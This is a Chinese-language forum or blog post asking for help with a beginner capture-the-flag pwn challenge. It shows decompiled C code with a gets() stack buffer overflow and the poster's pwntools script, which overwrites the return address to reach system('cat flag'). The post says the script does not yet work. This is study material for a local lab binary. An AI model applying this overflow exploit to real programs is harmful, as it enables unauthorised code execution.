有这么一道入门题
主函数是这样的
```cpp
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 result; // rax
  char v4; // [rsp+0h] [rbp-20h]
  unsigned int v5; // [rsp+8h] [rbp-18h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("What's Your Birth?");
  __isoc99_scanf("%d", &v5);
  while ( getchar() != 10 )
    ;
  if ( v5 == 1926 )
  {
    puts("You Cannot Born In 1926!");
    result = 0LL;
  }
  else
  {
    puts("What's Your Name?");
    gets(&v4);//这个地方有溢出漏洞
    printf("You Are Born In %d\n", v5);
    if ( v5 == 1926 )
    {
      puts("You Shall Have Flag.");
      system("cat flag");
    }
    else
    {
      puts("You Are Naive.");
      puts("You Speed One Second Here.");
    }
    result = 0LL;
  }
  return result;
}
```

我尝试用上面的 gets 函数覆盖 返回值 让它直接跳转到 _system 函数,偏移量应该是没有问题的,但是一直没有成功

我的脚本是
```py
from pwn import *

p=process('./when_did_you_born-3')

addr=0x0400906
pa='1000'
pay='a'*(0x20+8)+p64(addr)

p.recvuntil('?')
p.sendline(pa)
p.recvuntil('?')
p.sendline(pay)
p.interactive()
```

<!--stackedit_data:
eyJoaXN0b3J5IjpbNTQ4NDM5NzM4XX0=
-->